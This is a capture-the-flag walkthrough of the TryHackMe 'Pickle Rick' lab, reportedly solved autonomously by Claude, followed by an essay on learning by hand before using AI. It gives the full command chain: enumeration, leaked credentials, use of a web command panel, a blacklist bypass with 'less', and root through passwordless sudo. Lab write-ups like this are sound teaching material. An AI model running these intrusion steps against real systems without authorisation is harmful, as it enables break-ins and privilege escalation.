# 🥒 Pickle Rick CTF — Solved by AI in ~10 Minutes

> *A case study on AI-assisted hacking, and why you should still learn everything manually first.*

**Room:** [TryHackMe — Pickle Rick](https://tryhackme.com/room/picklerick)  
**Difficulty:** Easy  
**Target IP:** `10.128.171.233`  
**Time to root:** ~10 minutes  
**Tools used:** nmap, gobuster, curl  
**Human keystrokes required:** 3 questions typed in plain English

---

## What This Is

This is not a standard CTF writeup. Plenty of those exist.

This is a demonstration of what an AI (Claude, by Anthropic) can do when pointed at a beginner CTF room — and more importantly, a reflection on what that *means* for anyone learning cybersecurity.

The AI performed every step autonomously: recon, web enumeration, credential discovery, bypassing a blacklisted command, filesystem exploration, privilege escalation check, and root access. No hints. No manual intervention. Three questions in plain English, three flags returned.

The question worth asking isn't *"wow, the AI is fast"* — it's **"what does this change about how we should learn?"**

---

## The Run — Step by Step

### 1. Recon

```bash
nmap -sV -p 80,443,22,8080 10.128.171.233 --open
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

Two ports. Web server on 80, SSH on 22. Start with HTTP — always.

---

### 2. Web Enumeration

**HTML source of the homepage:**

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

Developer left credentials in a comment. Classic.

**robots.txt:**

```
Wubbalubbadubdub
```

One string. Likely a password.

**Directory bruteforce:**

```bash
gobuster dir -u http://10.128.171.233 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```
/login.php     → 200 OK
/portal.php    → 302 (redirects to login)
/denied.php    → 302 (redirects to login)
```

---

### 3. Login → Remote Code Execution

Credentials: `R1ckRul3s` / `Wubbalubbadubdub`

POST to `/login.php` returned a `302` redirect to `/portal.php`. Login successful.

The portal exposed a command execution panel running as `www-data`. OS-level RCE, no exploit needed — it was just *there*, exposed behind a login form.

```bash
ls
```

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

The application had `cat` blacklisted. Bypassed immediately with `less` — a one-word substitution. The filter was decorative.

The portal also had a multi-layer base64 encoded comment in the HTML. Five decoding rounds later: `rabbit hole`. The AI identified and discarded it without hesitation.

---

### 4. Flag 1 — Web Root

```bash
less Sup3rS3cretPickl3Ingred.txt
```

```
mr. meeseek hair
```

---

### 5. Flag 2 — User Home

```bash
ls /home
# rick  ubuntu

ls /home/rick
# second ingredients   ← filename with a space

less /home/rick/'second ingredients'
```

```
1 jerry tear
```

---

### 6. Privilege Escalation → Root

```bash
sudo -l
```

```
User www-data may run the following commands:
    (ALL) NOPASSWD: ALL
```

Full passwordless sudo. The web server user could run anything as root with no authentication. One command away from full system control.

```bash
sudo less /root/3rd.txt
```

```
3rd ingredients: fleeb juice
```

---

## All Three Flags

| # | Ingredient | Location |
|---|---|---|
| 1 | `mr. meeseek hair` | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` |
| 2 | `1 jerry tear` | `/home/rick/second ingredients` |
| 3 | `fleeb juice` | `/root/3rd.txt` |

---

## The Attack Chain

```
Port scan → HTTP on 80
  └─► HTML comment         → username: R1ckRul3s
  └─► robots.txt           → password: Wubbalubbadubdub
  └─► gobuster             → /login.php, /portal.php
        └─► Login (POST)   → authenticated
              └─► RCE panel (www-data)
                    ├─► cat blacklisted → bypassed with less
                    ├─► Flag 1: /var/www/html/Sup3rS3cretPickl3Ingred.txt
                    ├─► Flag 2: /home/rick/second ingredients
                    └─► sudo -l → NOPASSWD: ALL → root
                          └─► Flag 3: /root/3rd.txt
```

---

## Vulnerabilities Exploited

| Vulnerability | Severity | Impact |
|---|---|---|
| Credentials in HTML comment | High | Authentication bypass |
| Unauthenticated RCE panel | Critical | Full OS command execution |
| Trivial `cat` blacklist | Low | Zero security value |
| `www-data` with `NOPASSWD: ALL` sudo | Critical | Instant privilege escalation to root |

None of these required an exploit. They were all misconfigurations. The machine was handed over, step by step, by its own setup.

---

## So What Does This Mean?

The AI went from zero to root in roughly 10 minutes, running standard tools, reading output, making decisions, pivoting when blocked, and discarding rabbit holes — all autonomously.

A beginner doing this manually for the first time might take 2–4 hours. An experienced pentester, maybe 20–30 minutes including notes.

Does that mean you should let AI do your CTFs and move on?

**No. And here's why that thinking will wreck you.**

---

## The Case for Doing It Manually First

When the AI ran `sudo -l` and saw `NOPASSWD: ALL`, it immediately knew what to do. That pattern recognition comes from somewhere — from countless humans who learned what sudo is, why `www-data` shouldn't have unrestricted access, what the security model of Linux user permissions actually means, and what "privilege escalation" looks like when you encounter it in the real world.

The AI is pattern-matching on the shoulders of everyone who learned it the hard way.

If you skip the manual phase, you end up in a dangerous position: you can get the flags, but you don't know *why* it worked. And in real engagements — actual red team ops, real infrastructure, environments that don't behave like a CTF box — that gap will surface. The target won't have conveniently named files. The sudo misconfiguration won't be that clean. The rabbit hole won't decode to "rabbit hole" — it'll waste an hour of your time before you realize it.

Doing it manually builds something that AI output cannot give you: **internalized understanding**.

When you've spent time manually:

- Running nmap and reading man pages to understand what `-sV` actually does
- Getting frustrated when gobuster finds nothing and learning to try different wordlists
- Spending 20 minutes on a rabbit hole and finally recognizing the pattern
- Looking up what `sudo -l` means, then reading about Linux privilege escalation
- Understanding *why* `NOPASSWD: ALL` on a web server user is catastrophic

...then when you eventually use AI or automation to assist you, you know exactly what it's doing and why. You can spot when it's wrong. You can guide it. You can adapt when something breaks.

**The manual phase isn't inefficiency. It's where the actual skill is built.**

The goal isn't to do things manually forever. The goal is to understand things deeply enough that when you automate them, you're accelerating — not bypassing — your expertise.

---

## AI as a Force Multiplier, Not a Replacement

Used correctly, AI in offensive security looks like this:

- You understand enumeration → AI runs it faster and doesn't miss obvious things
- You understand privilege escalation paths → AI surfaces candidates you check and verify
- You understand what a finding means → AI helps you document it clearly and quickly
- You've done the lab work → AI compresses execution time without compressing understanding

Used incorrectly, it looks like flags collected with no idea why, a portfolio built on outputs you can't explain, and a skills gap that becomes obvious the moment someone asks you a follow-up question.

This writeup exists at the intersection of both: a demonstration of what AI can do at speed, and an argument for why the foundation that makes AI useful still has to be built by hand.

---

## Tools

- `nmap` — port and service discovery
- `gobuster` — web directory enumeration
- `curl` — HTTP interaction and session management
- `less` — cat blacklist bypass
- `sudo` — privilege escalation

---

*Written with AI assistance — [Claude by Anthropic](https://claude.ai)*  
*GitHub: [github.com/7xm7](https://github.com/7xm7)*
